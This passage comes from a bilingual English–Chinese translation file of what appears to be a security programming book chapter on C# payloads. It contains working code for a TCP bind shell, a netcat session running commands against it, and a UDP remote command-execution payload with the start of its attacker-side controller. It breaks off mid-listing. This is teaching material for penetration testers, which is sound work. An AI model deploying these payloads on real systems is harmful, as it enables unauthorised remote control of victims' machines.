    first element from the split and assign it as the command to be run, using LINQ
    to select the first element in the array ➐. We then use LINQ again to join all
    the strings in the split array after the first element ➑ and assign the resulting
    string (with the argument separated by spaces) to the arg variable.
  id: totrans-129
  prefs: []
  type: TYPE_NORMAL
  zh: 为了解析并执行来自流的命令并将输出返回给连接的攻击者，我们在内部while循环中声明一系列字符串变量，并在字符串中按空格拆分原始输入 ➏。接下来，我们从拆分结果中取出第一个元素，并将其作为要运行的命令，使用LINQ选择数组中的第一个元素
    ➐。然后，我们再次使用LINQ将拆分数组中的所有字符串（从第一个元素开始）连接起来 ➑，并将生成的字符串（以空格分隔的参数）赋值给arg变量。
- en: Executing Commands from the Stream
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: 从流中执行命令
- en: Now we can set up our Process and ProcessStartInfo classes to run the command
    with the arguments, if any, and capture the output, as shown in [Listing 4-8](#filepos367006).
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们可以设置我们的Process和ProcessStartInfo类来运行命令及其参数（如果有的话），并捕获输出，如[Listing 4-8](#filepos367006)所示。
- en: try
  id: totrans-132
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 尝试
- en: '{'
  id: totrans-133
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: Process prc = new ➊Process();
  id: totrans-134
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Process prc = new ➊Process();
- en: prc.StartInfo = new ProcessStartInfo();
  id: totrans-135
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: prc.StartInfo = new ProcessStartInfo();
- en: prc.StartInfo.➋FileName = filename;
  id: totrans-136
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: prc.StartInfo.➋FileName = filename;
- en: prc.StartInfo.➌Arguments = arg;
  id: totrans-137
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: prc.StartInfo.➌Arguments = arg;
- en: prc.StartInfo.UseShellExecute = false;
  id: totrans-138
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: prc.StartInfo.UseShellExecute = false;
- en: prc.StartInfo.RedirectStandardOutput = true;
  id: totrans-139
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: prc.StartInfo.RedirectStandardOutput = true;
- en: prc.➍Start();
  id: totrans-140
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: prc.➍Start();
- en: prc.StandardOutput.BaseStream.➎CopyTo(stream);
  id: totrans-141
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: prc.StandardOutput.BaseStream.➎CopyTo(stream);
- en: prc.WaitForExit();
  id: totrans-142
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: prc.WaitForExit();
- en: '}'
  id: totrans-143
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: catch
  id: totrans-144
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: catch
- en: '{'
  id: totrans-145
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: string error = "Error running command " + cmd + "\n";
  id: totrans-146
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string error = "运行命令时出错 " + cmd + "\n";
- en: byte[] errorBytes = ➏Encoding.ASCII.GetBytes(error);
  id: totrans-147
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: byte[] errorBytes = ➏Encoding.ASCII.GetBytes(error);
- en: stream.➐Write(errorBytes, 0, errorBytes.Length);
  id: totrans-148
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: stream.➐Write(errorBytes, 0, errorBytes.Length);
- en: '}'
  id: totrans-149
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-150
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-151
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-152
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-153
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-154
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-155
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-156
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-157
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: 'Listing 4-8: Running the command, capturing the output, and sending it back
    to the attacker'
  id: totrans-158
  prefs: []
  type: TYPE_NORMAL
  zh: 'Listing 4-8: 运行命令，捕获输出，并将其发送回攻击者'
- en: As with the connect-back payload discussed in the previous section, in order
    to run the command, we instantiate a new Process class ➊ and assign a new ProcessStartInfo
    class to the Process class’s StartInfo property. We set the command filename to
    the FileName property ➋ in StartInfo and set the Arguments property ➌ with the
    arguments to the command. We then set the UseShellExecute property to false so
    that our executable starts the command directly, and we set the RedirectStandardOutput
    property to true so we can capture the command output and return it to the attacker.
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
  zh: 与上一节讨论的反向连接有效负载一样，为了运行命令，我们实例化一个新的 `Process` 类 ➊，并将一个新的 `ProcessStartInfo` 类赋值给
    `Process` 类的 `StartInfo` 属性。我们将命令文件名设置为 `StartInfo` 中的 `FileName` 属性 ➋，并将命令参数设置为
    `Arguments` 属性 ➌。然后，我们将 `UseShellExecute` 属性设置为 `false`，以便我们的可执行文件直接启动命令，并将 `RedirectStandardOutput`
    属性设置为 `true`，以便我们捕获命令输出并将其返回给攻击者。
- en: To start the command, we call the Process class’s Start() method ➍. While the
    process is running, we copy the standard output stream directly to the network
    stream sent to the attacker by passing it in as an argument to CopyTo() ➎, and
    then we wait for the process to exit. If an error occurs, we convert the string
    Error running command <cmd> to an array of bytes using Encoding.ASCII.GetBytes()
    ➏. The byte array is then written to the network stream and sent to the attacker
    using the stream’s Write() method ➐.
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
  zh: 要启动命令，我们调用 `Process` 类的 `Start()` 方法 ➍。在进程运行时，我们将标准输出流直接复制到网络流中，通过将其作为参数传递给
    `CopyTo()` ➎，然后等待进程退出。如果发生错误，我们将字符串“Error running command <cmd>”转换为字节数组，使用 `Encoding.ASCII.GetBytes()`
    ➏。然后，字节数组写入网络流，并通过流的 `Write()` 方法 ➐ 发送给攻击者。
- en: Running the payload with 4444 as the argument will make the listener start listening
    on port 4444 on all available interfaces. We can now use netcat to connect to
    the listening port, as shown in [Listing 4-9](#filepos369421), and begin executing
    commands and returning their output.
  id: totrans-161
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 4444 作为参数运行有效负载将使监听器开始在所有可用接口的端口 4444 上监听。现在，我们可以使用 netcat 连接到监听端口，如 [列表
    4-9](#filepos369421) 所示，并开始执行命令并返回其输出。
- en: $ nc 127.0.0.1 4444
  id: totrans-162
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $ nc 127.0.0.1 4444
- en: whoami
  id: totrans-163
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: whoami
- en: bperry
  id: totrans-164
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: bperry
- en: uname
  id: totrans-165
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: uname
- en: 'Linux Listing 4-9: Connecting to the binding payload and executing commands'
  id: totrans-166
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Linux 列表 4-9：连接到绑定有效负载并执行命令
- en: Using UDP to Attack a Network
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 UDP 攻击网络
- en: 'The payloads discussed so far have used TCP to communicate; TCP is a stateful
    protocol that allows two computers to maintain a connection with each other over
    time. An alternative protocol is UDP, which, unlike TCP, is stateless: no connection
    is maintained between two networked machines when communicating. Instead, communication
    is performed via broadcasts across the network, with each computer listening for
    broadcasts to its IP address.'
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: 到目前为止讨论的有效负载使用 TCP 进行通信；TCP 是一种有状态协议，允许两台计算机在一段时间内保持连接。另一种协议是 UDP，它与 TCP 不同，是无状态的：在通信时，两个网络计算机之间不保持连接。相反，通信通过广播进行，每台计算机监听其
    IP 地址的广播。
- en: Another very important distinction between UDP and TCP is that TCP attempts
    to ensure that packets sent to a machine will reach that machine in the same order
    in which they were sent. In contrast, UDP packets may be received in any order,
    or not at all, which makes UDP less reliable than TCP.
  id: totrans-169
  prefs: []
  type: TYPE_NORMAL
  zh: UDP 和 TCP 之间的另一个非常重要的区别是，TCP 尝试确保发送到计算机的数据包将按发送顺序到达该计算机。相比之下，UDP 数据包可能会以任何顺序接收，甚至可能根本不接收，这使得
    UDP 比 TCP 更不可靠。
- en: UDP does, however, have some benefits. For one, because it doesn’t try to ensure
    that computers receive the packets it sends, it’s blazingly fast. It’s also not
    as commonly scrutinized on networks as TCP is, with some firewalls configured
    to handle TCP traffic only. This makes UDP is a great protocol to use when attacking
    a network, so let’s see how to write a UDP payload to execute a command on a remote
    machine and return the results.
  id: totrans-170
  prefs: []
  type: TYPE_NORMAL
  zh: 然而，UDP 确实有一些优点。首先，由于它不尝试确保计算机接收它发送的数据包，因此它非常快速。它在网络上的监控也不如 TCP 常见，某些防火墙仅配置处理
    TCP 流量。这使得 UDP 成为攻击网络时的理想协议，因此让我们看看如何编写一个 UDP 有效负载，在远程计算机上执行命令并返回结果。
- en: Instead of using the TcpClient or TcpListener classes to achieve a connection
    and communicate, as in previous payloads, we’ll use the UdpClient and Socket classes
    over UDP. Both the attacker and target machines will need to listen for UDP broadcasts
    as well as maintain a socket to broadcast data to the other computer.
  id: totrans-171
  prefs: []
  type: TYPE_NORMAL
  zh: 不像以前的有效载荷那样使用TcpClient或TcpListener类来实现连接和通信，我们将使用UdpClient和Socket类通过UDP通信。攻击者和目标机器都需要监听UDP广播，并保持一个套接字以将数据广播到另一台计算机。
- en: The Code for the Target’s Machine
  id: totrans-172
  prefs: []
  type: TYPE_NORMAL
  zh: 目标机器的代码
- en: The code to run on the target machine will listen on a UDP port for commands,
    execute those commands, and return the output to the attacker via a UDP socket,
    as shown in [Listing 4-10](#filepos372322).
  id: totrans-173
  prefs: []
  type: TYPE_NORMAL
  zh: 目标机器上运行的代码将监听UDP端口接收命令，执行这些命令，并通过UDP套接字将输出返回给攻击者，如[列表 4-10](#filepos372322)所示。
- en: public static void Main(string[] args)
  id: totrans-174
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: public static void Main(string[] args)
- en: '{'
  id: totrans-175
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: int lport = int.➊Parse(args[0]);
  id: totrans-176
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: int lport = int.➊Parse(args[0]);
- en: using (UdpClient listener = new ➋UdpClient(lport))
  id: totrans-177
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: using (UdpClient listener = new ➋UdpClient(lport))
- en: '{'
  id: totrans-178
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: IPEndPoint localEP = new ➌IPEndPoint(IPAddress.Any, lport);
  id: totrans-179
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: IPEndPoint localEP = new ➌IPEndPoint(IPAddress.Any, lport);
- en: string cmd;
  id: totrans-180
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string cmd;
- en: 'byte[] input; Listing 4-10: First five lines of the  Main()  method for the
    target code'
  id: totrans-181
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: byte[] input; 列表 4-10：目标代码中Main()方法的前五行
- en: Before sending and receiving data, we set up a variable for the port to listen
    on. (To keep things simple, we’ll have both the target and attacker machines listen
    for data on the same port, but this assumes we are attacking a separate virtual
    machine). As shown in [Listing 4-10](#filepos372322), we use Parse() ➊ to turn
    the string passed as an argument into an integer, and then we pass the port to
    the UdpClient constructor ➋ to instantiate a new UdpClient. We also to set up
    the IPEndPoint class ➌, which encompasses a network interface and a port, by passing
    in IPAddress.Any as the first argument and the port to listen on as the second
    argument. We assign the new object to the localEP (local endpoint) variable. Now
    we can begin receiving data from network broadcasts.
  id: totrans-182
  prefs: []
  type: TYPE_NORMAL
  zh: 在发送和接收数据之前，我们设置了一个变量用于监听的端口。（为了简化起见，我们让目标和攻击者机器在同一端口上监听数据，但这假设我们在攻击一台独立的虚拟机）。如[列表
    4-10](#filepos372322)所示，我们使用Parse() ➊将传入的字符串参数转换为整数，然后将端口传递给UdpClient构造函数 ➋来实例化一个新的UdpClient。我们还设置了IPEndPoint类
    ➌，它包含一个网络接口和一个端口，传入IPAddress.Any作为第一个参数，监听的端口作为第二个参数。我们将新对象赋值给localEP（本地端点）变量。现在我们可以开始接收来自网络广播的数据。
- en: The Main while Loop
  id: totrans-183
  prefs: []
  type: TYPE_NORMAL
  zh: 主while循环
- en: As shown in [Listing 4-11](#filepos374741), we begin with a while loop that
    loops continuously until an empty string is received from the attacker.
  id: totrans-184
  prefs: []
  type: TYPE_NORMAL
  zh: 如[列表 4-11](#filepos374741)所示，我们从一个while循环开始，该循环会持续运行，直到从攻击者接收到一个空字符串。
- en: while (true)
  id: totrans-185
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: while (true)
- en: '{'
  id: totrans-186
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: input = listener.➊Receive(ref localEP);
  id: totrans-187
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: input = listener.➊Receive(ref localEP);
- en: cmd = ➋Encoding.ASCII.GetString(input, 0, input.Length);
  id: totrans-188
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: cmd = ➋Encoding.ASCII.GetString(input, 0, input.Length);
- en: if (string.IsNullOrEmpty(cmd))
  id: totrans-189
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: if (string.IsNullOrEmpty(cmd))
- en: '{'
  id: totrans-190
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: listener.Close();
  id: totrans-191
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: listener.Close();
- en: return;
  id: totrans-192
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: return;
- en: '}'
  id: totrans-193
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: ''
  id: totrans-194
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: if (string.IsNullOrWhiteSpace(cmd))
  id: totrans-195
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: if (string.IsNullOrWhiteSpace(cmd))
- en: continue;
  id: totrans-196
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: continue;
- en: ''
  id: totrans-197
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: string[] split = cmd.Trim().➌Split(' ');
  id: totrans-198
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string[] split = cmd.Trim().➌Split(' ');
- en: string filename = split.➍First();
  id: totrans-199
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string filename = split.➍First();
- en: string arg = string.➎Join(" ", split.Skip(1));
  id: totrans-200
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string arg = string.➎Join(" ", split.Skip(1));
- en: 'string results = string.Empty; Listing 4-11: Listening for UDP broadcasts with
    commands and parsing the command from the arguments'
  id: totrans-201
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string results = string.Empty; 列表 4-11：监听UDP广播并从参数中解析命令
- en: In this while loop, we call listener.Receive(), passing in the IPEndPoint class
    we instantiated. Receiving data from the attacker, Receive() ➊ fills the localEP
    Address property with the attacking host’s IP address and other connection information,
    so we can use this data later when responding. Receive() also blocks execution
    of the payload until a UDP broadcast is received.
  id: totrans-202
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个while循环中，我们调用listener.Receive()，传入我们实例化的IPEndPoint类。接收到来自攻击者的数据后，Receive()
    ➊会将localEP的Address属性填充为攻击主机的IP地址和其他连接信息，以便我们稍后在响应时使用这些数据。Receive()还会阻塞有效载荷的执行，直到接收到一个UDP广播。
- en: Once a broadcast is received, Encoding.ASCII.GetString() ➋ converts the data
    to an ASCII string. If the string is null or empty, we break from the while loop
    and let the payload process finish and exit. If the string consists only of whitespace,
    we restart the loop using continue to receive a new command from the attacker.
    Once we’ve ensured that the command isn’t an empty string or whitespace, we split
    it on any spaces ➌ (same as we did in the TCP payloads) and then separate the
    command from the string array returned by the split ➍. We then create the argument
    string by joining all the strings in the split array after the first array element
    ➎.
  id: totrans-203
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦收到广播，Encoding.ASCII.GetString() ➋ 将数据转换为 ASCII 字符串。如果字符串为 null 或为空，我们将跳出 while
    循环，让有效载荷进程完成并退出。如果字符串仅包含空格，我们将使用 continue 重新启动循环，等待接收来自攻击者的新命令。确保命令不是空字符串或仅包含空格后，我们会按照空格
    ➌ 将命令分割（与 TCP 有效载荷中相同），然后从分割后的字符串数组中提取命令 ➍。接着我们通过连接分割数组中的所有元素（除了第一个元素）来创建参数字符串
    ➎。
- en: Executing the Command and Returning the Result to the Sender
  id: totrans-204
  prefs: []
  type: TYPE_NORMAL
  zh: 执行命令并返回结果给发送者
- en: Now we can execute the command and return the result to the sender via a UDP
    broadcast, as shown in [Listing 4-12](#filepos378195).
  id: totrans-205
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们可以执行命令并通过 UDP 广播将结果返回给发送者，如 [示例 4-12](#filepos378195) 所示。
- en: try
  id: totrans-206
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: try
- en: '{'
  id: totrans-207
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: Process prc = new Process();
  id: totrans-208
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Process prc = new Process();
- en: prc.StartInfo = new ProcessStartInfo();
  id: totrans-209
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: prc.StartInfo = new ProcessStartInfo();
- en: prc.StartInfo.FileName = filename;
  id: totrans-210
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: prc.StartInfo.FileName = filename;
- en: prc.StartInfo.Arguments = arg;
  id: totrans-211
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: prc.StartInfo.Arguments = arg;
- en: prc.StartInfo.UseShellExecute = false;
  id: totrans-212
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: prc.StartInfo.UseShellExecute = false;
- en: prc.StartInfo.RedirectStandardOutput = true;
  id: totrans-213
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: prc.StartInfo.RedirectStandardOutput = true;
- en: prc.Start();
  id: totrans-214
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: prc.Start();
- en: prc.WaitForExit();
  id: totrans-215
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: prc.WaitForExit();
- en: results = prc.StandardOutput.➊ReadToEnd();
  id: totrans-216
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: results = prc.StandardOutput.➊ReadToEnd();
- en: '}'
  id: totrans-217
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: catch
  id: totrans-218
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: catch
- en: '{'
  id: totrans-219
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: 'results = "There was an error running the command: " + filename;'
  id: totrans-220
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: results = "运行命令时出错：" + filename;
- en: '}'
  id: totrans-221
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: ''
  id: totrans-222
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: using (Socket sock = new ➋Socket(AddressFamily.InterNetwork,
  id: totrans-223
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 使用 (Socket sock = new ➋Socket(AddressFamily.InterNetwork,
- en: SocketType.Dgram, ProtocolType.Udp))
  id: totrans-224
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: SocketType.Dgram, ProtocolType.Udp))
- en: '{'
  id: totrans-225
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: IPAddress sender = ➌localEP.Address;
  id: totrans-226
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: IPAddress sender = ➌localEP.Address;
- en: IPEndPoint remoteEP = new ➍IPEndPoint(sender, lport);
  id: totrans-227
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: IPEndPoint remoteEP = new ➍IPEndPoint(sender, lport);
- en: byte[] resultsBytes = Encoding.ASCII.GetBytes(results);
  id: totrans-228
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: byte[] resultsBytes = Encoding.ASCII.GetBytes(results);
- en: sock.➎SendTo(resultsBytes, remoteEP);
  id: totrans-229
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: sock.➎SendTo(resultsBytes, remoteEP);
- en: '}'
  id: totrans-230
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-231
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-232
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-233
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-234
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-235
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: 'Listing 4-12: Executing the command received and broadcasting the output back
    to the attacker'
  id: totrans-236
  prefs: []
  type: TYPE_NORMAL
  zh: 示例 4-12：执行收到的命令并将输出广播回攻击者
- en: 'As with the previous payloads, we use the Process and ProcessStartInfo classes
    to execute the command and return the output. We set up the StartInfo property
    with the filename and arg variables we used to store the command and command arguments,
    respectively, and we also set the UseShellExecute property and the RedirectStandardOutput
    property. We begin the new process by calling the Start() method and then wait
    until the process has finished execution by calling WaitForExit(). Once the command
    finishes, we call the ReadToEnd() method ➊ on the StandardOutput stream property
    of the process and save the output to the results string declared earlier. If
    an error occurred during process execution, we instead assign the string There
    was an error running the command: <cmd> to the results variable.'
  id: totrans-237
  prefs: []
  type: TYPE_NORMAL
  zh: 与之前的有效载荷类似，我们使用 Process 和 ProcessStartInfo 类来执行命令并返回输出。我们使用 filename 和 arg 变量分别存储命令和命令参数，并将它们设置到
    StartInfo 属性中，同时还设置 UseShellExecute 属性和 RedirectStandardOutput 属性。通过调用 Start()
    方法启动新进程，然后调用 WaitForExit() 方法等待进程执行完毕。一旦命令执行完毕，我们通过读取进程的 StandardOutput 流属性的 ReadToEnd()
    方法 ➊ 来获取输出，并将其保存到之前声明的 results 字符串中。如果在进程执行过程中发生错误，我们会将字符串 "运行命令时出错：<cmd>" 赋值给
    results 变量。
- en: Now we need to set up the socket that will be used to return the command output
    to the sender. We’ll broadcast the data using a UDP socket. Using the Socket class,
    we instantiate a new Socket ➋ by passing enumeration values as the arguments to
    the Socket constructor. The first value, AddressFamily.InterNetwork, says we’ll
    be communicating using IPv4 addresses. The second value, SocketType.Dgram, means
    that we’ll be communicating using UDP datagrams (the D in UDP) instead of TCP
    packets. The third and final value, ProtocolType.Udp, tells the socket that we’ll
    be using UDP to communicate with the remote host.
  id: totrans-238
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们需要设置一个用于将命令输出返回给发送者的套接字。我们将使用 UDP 套接字广播数据。通过使用 Socket 类，我们通过将枚举值作为参数传递给
    Socket 构造函数来实例化一个新的 Socket ➋。第一个值 AddressFamily.InterNetwork 表示我们将使用 IPv4 地址进行通信。第二个值
    SocketType.Dgram 表示我们将使用 UDP 数据报（UDP 中的 D）而不是 TCP 包进行通信。第三个值 ProtocolType.Udp
    告诉套接字我们将使用 UDP 与远程主机进行通信。
- en: After creating the socket to be used for communication, we assign a new IPAddress
    variable with the value of the localEP.Address property ➌, which was previously
    filled with the attacker’s IP address upon receiving data on our UDP listener.
    We create a new IPEndPoint ➍ with the IPAddress of the attacker and the listening
    port that was passed as the argument to the payload.
  id: totrans-239
  prefs: []
  type: TYPE_NORMAL
  zh: 在创建用于通信的套接字后，我们通过获取 localEP.Address 属性 ➌ 的值来分配一个新的 IPAddress 变量，该值在接收到 UDP 监听器上的数据时会被填充为攻击者的
    IP 地址。我们使用攻击者的 IP 地址和作为有效负载参数传递的监听端口，创建一个新的 IPEndPoint ➍。
- en: Once we have the socket set up and we know where we are returning our command
    output, Encoding.ASCII.GetBytes() converts the output to a byte array. We use
    SendTo() ➎ on the socket to broadcast the data back to the attacker by passing
    the byte array containing the command output as the first argument and passing
    the sender’s endpoint as the second argument. Finally, we iterate back to the
    top of the while loop to read in another command.
  id: totrans-240
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦我们设置好了套接字并且知道将命令输出返回到哪里，Encoding.ASCII.GetBytes() 就会将输出转换为字节数组。我们使用 SendTo()
    ➎ 在套接字上广播数据，通过将包含命令输出的字节数组作为第一个参数，发送者的端点作为第二个参数，最终，我们再次返回到 while 循环的顶部读取下一个命令。
- en: The Attacker’s Code
  id: totrans-241
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者的代码
- en: In order for this attack to work, the attacker must be able to listen to and
    send UDP broadcasts to the correct host. [Listing 4-13](#filepos382307) shows
    the first bit of code to set up a UDP listener.
  id: totrans-242
  prefs: []
  type: TYPE_NORMAL
  zh: 为了使此次攻击有效，攻击者必须能够监听并向正确的主机发送 UDP 广播。[列表 4-13](#filepos382307) 显示了设置 UDP 监听器的第一段代码。
- en: static void Main(string[] args)
  id: totrans-243
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: static void Main(string[] args)
- en: '{'
  id: totrans-244
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: int lport = int.➊Parse(args[1]);
  id: totrans-245
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: int lport = int.➊Parse(args[1]);
- en: using (UdpClient listener = new ➋UdpClient(lport))
  id: totrans-246
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: using (UdpClient listener = new ➋UdpClient(lport))
- en: '{'
  id: totrans-247
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: IPEndPoint localEP = new ➌IPEndPoint(IPAddress.Any, lport);
  id: totrans-248
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: IPEndPoint localEP = new ➌IPEndPoint(IPAddress.Any, lport);
- en: string output;
  id: totrans-249
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string output;
- en: 'byte[] bytes; Listing 4-13: Setting up the UDP listener and other variables
    for the attacker-side code'
  id: totrans-250
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: byte[] bytes; 列表 4-13：为攻击者端代码设置 UDP 监听器和其他变量
- en: Assuming that this code will take as arguments the host to send commands to
    and the port to listen on, we pass the port to listen on to Parse() ➊ in order
    to convert the string into an integer, and then we pass the resulting integer
    to the UdpClient constructor ➋ to instantiate a new UdpClient class. We then pass
    the listening port to the IPEndPoint class constructor, along with the IPAddress.Any
    value to instantiate a new IPEndPoint class ➌. Once the IPEndPoint is set up,
    we declare the variables output and bytes for later use.
  id: totrans-251
  prefs: []
  type: TYPE_NORMAL
  zh: 假设该代码将接受作为参数的目标主机和监听端口，我们将监听端口传递给 Parse() ➊ 以将字符串转换为整数，然后将结果整数传递给 UdpClient
    构造函数 ➋ 来实例化一个新的 UdpClient 类。接着，我们将监听端口传递给 IPEndPoint 类的构造函数，并传递 IPAddress.Any
    值来实例化一个新的 IPEndPoint 类 ➌。一旦 IPEndPoint 设置好，我们声明变量 output 和 bytes 以备后用。
- en: Creating the Variables to Send the UDP Broadcasts
  id: totrans-252
  prefs: []
  type: TYPE_NORMAL
  zh: 创建用于发送 UDP 广播的变量
- en: '[Listing 4-14](#filepos383940) shows how to create the variables to be used
    to send the UDP broadcasts.'
  id: totrans-253
  prefs: []
  type: TYPE_NORMAL
  zh: '[列表 4-14](#filepos383940) 显示了如何创建用于发送 UDP 广播的变量。'
- en: using (Socket sock = new ➊Socket(AddressFamily.InterNetwork,
  id: totrans-254
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: using (Socket sock = new ➊Socket(AddressFamily.InterNetwork,
- en: SocketType.Dgram,
  id: totrans-255
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: SocketType.Dgram,
- en: ProtocolType.Udp))
  id: totrans-256
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: ProtocolType.Udp))
- en: '{'
  id: totrans-257
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: IPAddress addr = ➋IPAddress.Parse(args[0]);
  id: totrans-258
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: IPAddress addr = ➋IPAddress.Parse(args[0]);
- en: 'IPEndPoint addrEP = new ➌IPEndPoint(addr, lport); Listing 4-14: Creating the
    UDP socket and endpoint to communicate with'
  id: totrans-259
  prefs:
  - PREF_BQ
